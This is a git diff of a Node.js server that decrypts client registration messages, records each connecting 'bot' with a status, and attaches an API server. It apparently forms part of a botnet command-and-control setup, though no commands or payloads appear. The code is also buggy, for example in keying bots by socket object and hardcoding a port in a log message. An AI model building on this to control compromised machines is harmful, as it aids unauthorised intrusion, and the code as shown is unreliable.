@@ -1,27 +1,39 @@
 import { createServer } from 'net';
 import { unencryptCMD } from './encryption.js';
+import {api} from "./api.js"
+import {bots} from "./db.js"
+import {config} from 'dotenv'
+config()
 
-const server = createServer((socket) => {
+const api_port = process.env.API_PORT || 3000
+const socket_port = process.env.SOCKET_PORT || 9000
+
+const socketServer = createServer((socket) => {
+
     socket.on('data', (data) => {
-        const decryptedData = unencryptCMD(data.toString());
-        console.log('Received:', decryptedData);
-        socket.write('Server reply: ' + decryptedData);
+        const newBotInfo = JSON.parse(unencryptCMD(data.toString()));
+        newBotInfo['status'] = "Connected"
+        bots[socket] = newBotInfo;
+        console.log('Client connected: ' + newBotInfo);
     });
+
 
     socket.on('end', () => {
         console.log('Client disconnected');
+        bots[socket]['status'] = "Disconnected"
     });
 
     socket.on('error', (err) => {
         console.error('Socket error:', err);
+        bots[socket]['status'] = "Disconnected"
     });
 });
 
-server.listen(9000, () => {
-    console.log('Server listening on port 9000');
+socketServer.listen(socket_port, () => {
+    console.log('Socket server listening on port 9000');
 });
 
-server.on('error', (err) => {
-    console.error('Server error:', err);
+api.socketServer = socketServer;
+api.listen(process.env.API_PORT, () => {
+    console.log(`API server listening on port ${api_port}`);
 });
-
